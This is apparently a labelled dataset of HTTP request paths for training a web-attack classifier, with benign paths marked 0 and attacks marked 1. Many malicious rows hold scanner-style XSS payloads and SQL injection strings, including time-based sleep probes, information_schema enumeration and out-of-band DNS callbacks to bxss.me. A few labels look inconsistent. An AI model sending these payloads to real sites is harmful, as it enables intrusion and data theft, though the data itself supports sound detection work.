request	label
/****/202107/t20210702_2909236.html	0
"/***/col195/index.html/""""><script>alert(207)</script>"	1
/zwxx_11337/****/201809/t20180905_1032403.html	0
/****/ysqgk/zzqzfzsjgzssydw/sy.html?id=79	0
/zwxx_11337/****/202001/t20200130_1936346.html	0
/xxgk%' and 2*3*8=6*8 and 'v3m6'!='v3m6%/******/tjj/zfxxgkml_2127/jytabljg_2061/list.html	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtmma3ahvhtb/cznlcm6c8ce=&openid=ovl7jjlqrlkv7igemxpqos4u6h-0&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhbx1liu7mkqrvuvbeywbebd7oo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbizmy fysexld/fu3ipt2oze=	0
/****/ezgg/ezggfz/201611/t20161114_105538.html	0
"/**/?cmd=new_section§ion=""%3<script>alert(777);</script>"	1
/****/0316/822325.shtml	0
/**********/system/2021/12/16/013495273.shtml	0
/******/e,n.complete?t(n):(n.onload=function(){n.onload=null,t(n)},void(n.onerror=function(e){n.onerror=null,i(e)}))}var	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgxs/202103/t20210309_2620285.html	0
"/****/web/search?channelid=299868&perpage=1000' and 8167=4115 	1
/****/gfxwj/list_33.html	0
/******/system/2017/05/27/012322172.shtml	0
"/************/risk-disclosure/2017-03-0""""xor(if(now()=sysdate(),sleep(6),0))xor""""z/673.html"	1
/*****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6b22\u6b23\u6c34\u4ea7\u7ecf\u9500\u90e8	0
/***/col200/index.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u7167\u519b\u670d\u88c5\u52a0\u5de5\u5382	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u601d\u6e90\u5e9f\u54c1\u6536\u8d2d\u7ad9	0
/***********/hongguanjingji/2021-11-23/2010.html	0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqgtjyt/zzqgtt/index_1.html	0
/****/zgsdt/2011zgsdt/index_4.html	0
/*******/xe1.php	1
/****************/notification?access_token=58080d57-5529-42f2-9ed9-5ed1b4853455&id=undefined	0
/*****/static/fonts/element-icons.732389d.ttf	0
"/**/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status="" onmouseover=""alert(777)"""	1
/****/web/search?channelid=222832&searchword=\u534e\u7535\u56fd\u9645\u5b81\u590f\u65b0\u80fd\u6e90\u53d1\u7535\u6709\u9650\u516c\u53f8\u5b81\u4e1c\u5206\u516c\u53f8	0
/****/2p0d3t-syxw-e109150537.html	0
/**********/system/2021/10/24/013469153.shtml	0
"/****/xxgknb/2010/list.html?new=0.4586328373203723'""""()&%<acx><script >kgc8(9349)</script>"	1
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/wzs/qtxs/xmb_gzdxb.htm	1
/****/system/2016/09/29/javascript:dozoom(14)	1
/**********/system/2021/12/19/013496794.shtml	0
/****/zxxbjt-syxw-e110803022.html	0
/***/003/002/991/00300299153_a7827f68.jpg	0
/****/api/apibankagreementcontroller/sendsoci801withtimecheck?lxsj=18676428656&gmsfhm=	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqkjt	0
"/****/p/bxss.me/t/xss.html?	1
/*******/mrj.php	1
/****/dzzb/201411/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/system/2018/03/06/javascript:window.close();	1
/**/vc/interface/visit.jsp?type=3&i_webid=1&i_columnid=84&i_articleid=222598&url=https:/axysex.com/nude/117467-fit-and-juicy-tushy-raw.php	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6559\u80b2\u5df7\u9752\u6625\u7684\u5473\u9053\u9910\u5385	0
/****/zjdt%' and 2*3*8=6*8 and 'zc5h'!='zc5h%/csjs/gzdt.htm	1
/****/system/2021/06/18/013404189.shtml	0
/****/sj1/tjxx/202109/t20210926_3048135.html	0
/****/201909/t20190926_1757459.html	0
/****/whhd/202105/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
"/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=bxss.me/t/xss.html?	1
"/**/ui/lib/easyui/themes/bxss.me/t/xss.html?	1
"/*****/""></a></dt>"	0
/****/b-e638993.html	0
/******/system/2020/05/02/013153631.shtml	0
/****/zgsdt/2021_qydt/202112/t20211215_323473.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u77ed\u89c6\u9891	0
/***/0/00/35/08/350847_976841.jpg	0
/****/msq/ldyl/	0
"/****/rwfc/202107/t20210730_313250.html/*/-->'""""></iframe></script></style></title></textarea><script >alert(03754)</script>"	1
/****/system/2020/04/01/javascript:window.close();	1
/****/qtyz/qywh/qtyz/rlzy/jypx/ywzzq/ywly/gccb/txgc/xwzx/mtgz/ywly/gccb/	0
/*********/20200420/javascript:void(0);	1
/******/tab-line.jpg	0
"/***/getsubject?data={""subject_id"":641,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":379705,""sign"":""""}"	0
/**********/system/2021/11/24/013484882.shtml	0
"/****/bmkx/sczj/"""	0
/****/byysqgk/xxgkzn/list.html?new='.gethostbyname(lc('hitoa'.'tgmbremu260cf.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(80).chr(106).chr(82).'	1
/****/jtdt/2012jtdt/201412/w020141218443228584017.jpg	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u601d\u817e\u6c34\u70df\u9152\u5427	0
/**********/system/2018/08/14/012677674.shtml	0
"/**/ui/lib/easyui/themes/bootstrap<esi:include src=""""http://bxss.me/rpb.png""""/>/messager.css"	1
"/****/czgk/bmyjs/gmzdp/zzqjsxs/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/******/system/2018/01/25/javascript:void();	1
/****/system/2015/08/25/javascript:dozoom(9)	1
/****/bxss.me/bmjs/gdyx/	1
/****/mtgz/2014mtgz/201503/t20150324_59267.html	0
/*****/createpage.action?spacekey=myproj	1
/**********/system/2021/12/07/013491024.shtml	0
/*******/qiye/b-e2092504.html	0
/****/zt/yqfkzccs/yqfkrx/202108/t20210823_2986726.html?ivk_sa=1024320u	0
/**********/system/2021/06/16/013402942.shtml	0
/****/xxgkml/qtfdxx/zcjd/qwjd/201611/t20161111_72671.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u7b49\u4e00\u4eba\u996e\u54c1\u5e97	0
/******/download/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc and 9123=9123-- iecv	1
/****************/notification?access_token=6a592c1b-ee8a-4d5e-ab75-865820876fa1&id=undefined	0
/******/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') and 3364=3364 and '1'='1	1
/***/interface/comul_total.json.jsp?callback=jquery19106393021999392658_1639526400013	0
"/************/template/jcse/110105008056111/16/images/plugin/websitechange/' 'a'.concat(70-3).concat(22*4).concat(106).concat(89).concat(107).concat(82) (require'socket'
socket.gethostbyname('hitsm' 'lkainiqv3cb23.bxss.me.')[3].to_s) '.css"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5b66\u751f\u90e8\u843d\u793c\u54c1\u5e97	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u6052\u4fe1\u901a\u7535\u8111\u7ecf\u9500\u90e8	0
/zwxx_11337/****/mtjd/202001/t20200120_1927609.html	0
/********/wf_work_stat_setting.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','kn88l'))	1
/****/20200826/e105710863.html	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202103/t20210304_178137.html	0
/****/css/chunk-12e52f90.76869910.css	0
/*******/qiye/b-e2372164.html	0
/**********/system/2021/02/26/013341682.shtml	0
/******/lists?cid=1 ) order by 1 desc,extractvalue(rand(),concat(0x7c,md5(997246853))) desc -- a	1
/****/xhjj/201611/t20161110_72497.html	0
/****/zzxxgk/bmfgj/fgfzgg_2770/fggzdt/201904/t20190417_116826.html	0
/****/20201110/e110094533.html	0
"/***/phpliteadmin_v1-1/phpliteadmin.php?table=""""/>alert(777)"	1
/****/czgk/bmjs/qtdw/zzqnkj/201708/t20170818_549514.html	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(768)</script>?_=1630311590850"	1
/***************/licaijzgg/20210609/9980.html	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqnky/index_1.html	0
/******/resource/js/photoswipe/3.0.5.1/klass.min.js	0
/******/system/2021/03/08/013347345.shtml	0
"/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1 if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""""xor(if(now()=sysdate(),sleep(0),0))or""""*/&token=1"	1
"/***/classifier,ruleset.jsp?action_flag=&page=1&kw=""/><script>alert(777)</script>&id=&domain=&keyword=&points="	1
/******/dsjy/qhyx	0
/att_flv/*/01/02/40/1024099_870386.flv	0
/****/zt/fgfgg/201706/t20170603_330212.html	0
/******/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/main.css	1
/*******/qiye/cases-e52979.html	0
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1920&h=1080&treeid=1022&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul2luzm8vmtexnc8xmjk1lmh0bq==&pagename=l2xpc3quannw&newsid=-1	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u535a\u65af\u670d\u88c5\u5e97	0
/****/0709/437616.shtml	1
/***/ddjs/ghgz/yqlj/gjcp/nyjx/kjcx/yfyfwpt/xwzx/zgsdt/2021_qydt/202111/t20211101_319870.html	0
/****/index.php?title=acunetixtest233711&action=submit	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6d77\u6e05\u7f8e\u53d1\u5e97	0
/*****/gy48/cpgyss.asp?key=\u9ad8\u6548\u8131\u8272\u7d6e\u51dd\u5242\u884c&l=\ufffd\ufffd\ufffd\u0279\ufffd	0
/****/qemkkk-article-e108119900.html	0
/****/zfxxgk/fdzdgknr/ghxx/zxgh/202001/t20200106_1915161.html	0
/zwxx_11337/****/zcjd/202109/t20210924_3046692.html	0
/***/nbhd/opengovmsgbox.do?appid='.gethostbyname(lc('hitey'.'ilgcgvpp9dc52.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(115).chr(69).chr(97).chr(72).'&method=listgovmsgboxs&pagesize=5&siteid=115	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u56fd\u5bb6\u4e2d\u592e\u516c\u56ed	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a&page=3	0
/****/jtdt/2021_jtyw/index_4.html	0
/**/products/nuclearpowerequipment/201505/w020150524334150898558.jpg	0
/****/web/search?perpage=20&outlinepage=10&keyword=1&channelid=240998&searchword=1&page=10); waitfor delay '0:0:2	1
/*****/gy42/ljcpgyview.asp?id=29274419&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/__local/*/94/a0/263495f4717a1d05e651f3f6738_21791fff_3b1.gif?e=.gif	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5927\u6e7e\u533a	0
/****/201909/w020190926583398533338.jpg	0
/****/b-e263395.html	0
/***/blockdata/getsearchinfo.do?&title=\u6c38\u5bff\u9ad8\u901f	0
"/************/template/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid'""""()&%<acx><script >vpin(9560)</script>.js"	1
/****/czgk/bmjs/sydw1/zzqwxdglwyhbgs/201708/t20170818_549518.html	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u9ed1\u5c71\u76d0\u6c60\u77f3\u6599\u5382	0
/****/hbsb/images/p020141127380508710736.jpg	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6e58\u897f	0
"/***/abantecart/index.php?rt=product/manufacturer&manufacturer_id=15""><script>alert(777);</script>"	1
"/vc<esi:include src=""""http://*******/rpb.png""""/>/ui/lib/easyui/plugins/jquery.linkbutton.js"	1
/***********/jinrongqihuo/guzhiqihuo/2020-12-09/1673.html	0
/*****/actionhandler/ajax_managed_services.php	1
/***/app/homepage.z?perid=52139	1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u9876\u597d\u997c\u5e97	0
/****/\ufffd\ufffd\ufffd\u047e\ufffd\ufffd\ufffd\u04b5	0
/***/wxzcgk/202008/t20200819_2191317.html?ivk_sa=1024320u	0
/***/xwzx/wzdt/qywh/bqsm/xxgk/qtgkxx/ddjs/jjgz/	0
/***********/jinrongqihuo/guozhaiqihuo/2021-09-01/1928.html	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u81ed\u6c27	0
/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/***/0/01/68/22/1682245_781444.jpg	0
/***/0/02/09/45/2094510_729590.jpg	0
/**********/system/2020/05/29/013173669.shtml	0
/***/interface/comul_total.json.jsp?callback=jquery17105812101593686139_1639980697755	0
/****/xqdt/hnx/201610/t20161025_50943.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=67207	0
/**/ourbusiness/rdandmanufacture/201412/t20141210_22163.html	0
/gywm_10175/****/gccb/txgc/gjcp/zxjx/qywh/whln/	0
"/***/getlist?data={""page_size"":20,""channel_type"":4,""channel_id"":12229}"	0
/************/interfaces/spellcheck.do?q=请输入关键词	1
/****/zgsdt/2010zgsdt/201412/t20141218_43295.html	0
/****/zdgz/2019_zdgz/index_7.html	0
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 3547=8155 #	1
/*****/bt/	0
/****/admin.php?cont=store_nas	1
/****/bmkx/sjsj/201701/t20170111_84716.html	0
/****/zt/lxyz/201706/w020170728654581806624.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u9970\u795e\u767e\u8d27\u5e97	0
/**********/system/2021/11/12/013478936.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8c6b\u5927\u7897\u70e9\u9762\u9986	0
/************/search.do?begin=20200819&end=20210819&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=1&tpl=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&websiteid=	1
"/****/qzfwj/201903/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5e7f\u4e1c\u529e\u4e8b\u5904</a>"	0
/*****/gy42/cpgyss.asp?key=\u5851\u6599\u5236\u888b\ufffd?&l2=\ufffd\u02f3\ufffd&l=\u027d\ufffd\ufffd	0
/****/xqdt/hnx/201610/t20161025_50945.html	0
/******/download/downfile.jsp?classid=0%' and 5758=5758 and '%'='&filename=9c9dc7f4baf3405e9cb7ca226a34c5fc.doc	1
/****/api/sources?resource=alert(/777/)&format=txt	1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u9752\u9547\u96f7\u7231\u8363\u51c9\u7c89\u644a	0
/******/usercenter/index?qrcode=scanqrcode&code=011tnjga1znikc02jmja1n1jds2tnjgw	0
/**********/system/2017/11/08/012463045.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6cd5\u6cbb\u5ba3\u4f20	0
/****/web/search?channelid=222832&searchword=\u4e2d\u56fd\u77f3\u6cb9\u5929\u7136\u6c14\u80a1\u4efd\u6709\u9650\u516c\u53f8\u5b81\u590f\u94f6\u5ddd\u9500\u552e\u5206\u516c\u53f8\u7816\u6e20\u52a0\u6c14\u7ad9	0
/****/ad_js.php?aid=1	1
/*****/gy42/ljcpgyview.asp?id=29451048&l2=\ufffd\ufffd\ufffd\ufffd&l=\u027d\ufffd\ufffd	0
/zwxx_11337/****/202111/t20211124_3147288.html	0
/zwxx_11337/****/201307/t20130729_303474.html	0
/****/wdszs/hfsz/201904/t20190426_117624.html	0
/**********/system/2020/04/16/013141760.shtml	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u4e0b\u9a6c\u5173\u9547\u521b\u65b0\u6c34\u78e8\u77f3\u5f69\u7816\u5382	0
/****/202009/t20200903_2215798.html	0
"/**/ui/lib<esi:include src=""""http://bxss.me/rpb.png""""/>/easyui/plugins/jquery.panel.js"	1
/****/nameko.php?op=999&id=&colorset=violet&fontsize=11; }</style><script>alert(777)</script><style>body { font-size:66	1
/******/carousel.css	0
/***/003/004/104/00300410405_2b06101d.png	0
/****/\ufffd\ufffd\u02f0	0
/**********/system/2015/12/14/011887837.shtml	0
/****/xef_35359/yw_1295/202111/t20211108_3118534.html	0
/****/xqldly/hfpcsj/202111/t20211123_196850.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u94b1\u6842\u5170\u852c\u83dc\u5e97	0
/****/index.html	0
"/****/bysw/swsj'""""()&%<acx><script >u9tg(9977)</script>/"	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u68a7\u6850\u672c\u8272\u9488\u7ec7\u54c1\u5e97	0
/***/invoice/documentinvoicelist?page=1&limit=100&orderno=16223007&starttime=&endtime=	0
/****/zhengce/zfwjn/201805/t20180522_103676.html	0
/****/img2/4.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u767d\u82f1\u6885\u670d\u88c5\u5e97	0
/****/js/lib/jquery%' and 2*3*8=6*8 and 'xwaa'!='xwaa%.js	1
/****/zjdt/gcjsbzgl/if(now()=sysdate(),sleep(12),0).htm	1
/*******/m97lm.php	1
/****/bmkx/sczj/202111/t20211110_196368.html	0
/zwxx_11337/****/ytdd/202111/w020211122590584146193.jpg	0
/**/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t	1
"/****/news/""><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/****/jtdt/2021_jtyw/202112/t20211213_323216.html	0
"/****/czgk/bmyjs/zzqjcyxt/xqqrmjcy/\""javascript:void(0)\"""	1
/******/system/2017/10/26/javascript:window.print()	1
"/************/template/jcse/110105008056111/16/images/plugin/selectpick/js.js/""><script>alert(4721)</script>"	1
/******/index.php	0
"/******/0/bxss.me/t/xss.html?	1
/**/system/2021/08/10/012190254.shtml	0
"/***/2021/10/11/art"""" and 2*3*8=6*8 and """"uki7""""=""""uki7_34_242320.html"	1
/****/xxgkml/qtfdxx/zcjd/szcjd/202103/w020210331365727636320.jpg	0
/***/blockdata/getsearchinfo.do?&title=\u58f9\u7396	0
/****/gjzqq/index.html?continent=-1) or 7269=7269#	1
"/****/zzxxgk/tjj/zfxxgkml_2127/tjxx/pcsj/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(119).concat(81).concat(109).concat(70) (require""""socket""""
socket.gethostbyname(""""hitym"""" """"rflxohki8c50a.bxss.me."""")[3].to_s) """""	1
/*******/shannan_765.html	0
/***/003/004/500/00300450070_a1c330e2.jpg	0
/******/resource/interview/room.jsp?wbinterviewid=1033%') and 5546=3454 and '%'='&owner=1707212448	1
/**********/system/2021/12/15/javascript:void(0);	1
/******/system/2020/10/21/javascript:void();	1
/*********/index/login/index.html?fromurl=st4r7s<a/ /onmouseover = confirm()
x//qqqxss3nd	1
/**********/system/2021/10/08/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u8001\u674e\u9c9c\u86cb\u9500\u552e\u90e8	0
/******/cms/www/201611/17124310uynq.jpg	0
/***/0/01/28/30/1283071_837569.jpg	0
/*******/qiye/b-e1660364.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u946b\u65e5\u8fbe\u4fdd\u6e29\u6750\u6599\u7ecf\u9500\u90e8	0
/*******/col195/index.html	1
/****/whhd/202012/w020201207588534779220.jpg	0
/************/template/http://bxss.me/t/fit.txt/110105008056111/16/images/plugin/criteria/css.css	1
"/****/gfxwj/202008/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/qzfwj/201801/t20180115_668896.html	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6587\u82d1\u5317\u8def\u4f18\u4e50\u996e\u6599\u5e97	0
"/******/1/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z.js"	1
/**********/system/2020/03/26/013125453.shtml	0
/*******/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/\u01bd\ufffd\ufffd\ufffd\u07f2\ufffd	0
/*******/qiye/b-e2321485.html	0
/******/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/******/download/downfile.jsp?classid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&filename=6aa38c8fa3484cb9b13a34cb28ac83de.docx	1
/******/system/2021/01/23/javascript:void(0);	1
/****/admin/dash_status.php?status_data[1]=alert(777);	1
/****/xh/jh/201708/t20170801_364943.html	0
/****/css/chunk-58b72a51.ae7dbb31.css	0
"/"""".gethostbyname(lc(""""hitjb"""".""""atsjexaye7b30.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(98).chr(65).chr(110).chr(82).""""/****/"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6cfd\u5143\u8fbe\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=jianxun¤tpage=18&query=java	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u98df\u9999\u9601\u9910\u5385	0
"/****/files.php?folder="""">alert(777)"	1
/****/shzr/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?page=2&channelid=253477%' or 3382=3382 and '%%'='%&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/*****/20190325/6370.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl%') or 7252=7252 #&owner=1707212448&wbfileid=51419	1
/*****/gy42/cpgyss.asp?key=\u8282\u80fd\u706f\u5341\u5927\u54c1\ufffd?&l2=\ufffd\ufffd&l=\ufffd\ufffd\ufffd	0
/****/xqdt/hnx/201610/url	0
/******/qhqy/zgyh/	0
/****/jt16	0
/***/003/004/421/00300442198_8d33820e.jpg	0
/***/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u601d\u5473\u51c9\u76ae\u5e97	0
/**********/system/2021/04/29/013378045.shtml	1
/**********/system/2017/04/06/012281077.shtml	0
/****/system/2021/12/01/013488354.shtml	0
/****/consultdetails/canada	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u897f\u5cb3\u697c\u996d\u9986	0
/****/bmkx/sgsj/202101/w020210120619878954383.jpg	0
/*******/qiye/b-e2050460.html	0
"/***/getlist?data={""page_size"":20,""channel_type"":4,""channel_id"":12222}"	0
/***********/zaojianpinglun/?_=1640016415390	0
/******/if(now()=sysdate(),sleep(15),0)/layout5.css	1
/****/czgk/bmjs/zzqjcyxt/xjxrmjcy/201808/t20180816_977448.html	0
/****/zzxxgk/jjhzj/zsxw/202112/t20211206_197339.html	0
/****/bmkx/scl/202107/url	0
/************/categorysearch.do?cateid=1&p=1&q='.gethostbyname(lc('hitto'.'lqzdnqivb97f1.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(109).chr(79).chr(100).chr(72).'&searchid=1&tpl=16&websiteid=110105008056111	1
/**********/system/2021/12/15/013494608.shtml	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8d3e\u5858\u4e61\u7530\u5170\u7efc\u5408\u95e8\u5e02\u90e8	0
/****/businesses-e27082.html?category_id=165680	0
/****/qzfwj/202001/t20200108_1917949.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u0479\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd	0
/****/zjdt'||'/czjs/zcwj/1.htm	1
/*******/qiye/b-e2455785.html	0
/****/lkw/yw_1292/202012/t20201203_2390589.html	0
/****/zdgz/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/zwxx_11337/****/202004/t20200408_2015327.html	0
/about-southwest/******/2020-06-15/ii/skin/wdatepicker.css	0
/zwxx_11337/****/202008/t20200817_2187611.html	0
/************/interfaces/dimension.do?bxss.me	1
/******/usercenter/index?qrcode=quicklyrq,3,16128,10388571&code=091fn3ha1o5tlc0z4mja1ilmdj2fn3hr	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(689)</script>?_=1630311553645"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6b63\u5174\u7535\u710a\u90e8	0
/zwxx_11337/****/202003/t20200324_2000422.html	0
/**/ui/lib/easyui/plugins/jquery.window'||'.js	1
/******/public/2019/11/04/93895.images/v93895_b1572835498076_app.jpg	0
"/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419') and 1645=1645 	1
/xinanyanjiu' and 2*3*8=6*8 and '5me6'='5me6/************/guzhiqihuo/2021-01-22/1713.html	1
"/****/wdsjs'""""()&%<acx><script >pimo(9432)</script>/hfswsj/zmhdyc.html"	1
"/***/getsubject?data={""subject_id"":362,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":5175,""sign"":""""}"	0
/**********/system/2020/08/11/013224177.shtml	0
/**********/system/2021/08/24/013439103.shtml	0
/****************/images/common/default/img_no_address.png	0
/****/202011/t20201125_256666.html	0
/****/xqdt/hnx/201909/t20190911_142057.html	0
/**********/system/2021/12/17/013495995.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u8000\u6587\u996d\u9986	0
/*****/gy42/ljcpgyview.asp?id=29647740&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/bmkx/sbwg/index_10.html	0
/*******/qiye/b-e257777.html	0
/**/system/2019/03/29/011737706.shtml	0
"/****/web/search?prekeyword=*/-->'""""></iframe></script></style></title></textarea><script >alert(16217)</script>"	1
/**********/system/2021/12/13/013493428.shtml	0
/***/0/02/12/41/2124195_664411.png	0
/********/cgi-bin/ipinfo.cgi?alert(777)	1
/******/hfpcsj/202111/t20211123_196850.html	0
/****/lybltj/202004/t20200408_150512.html	0
/****/202107/t20210730_313250.html	0
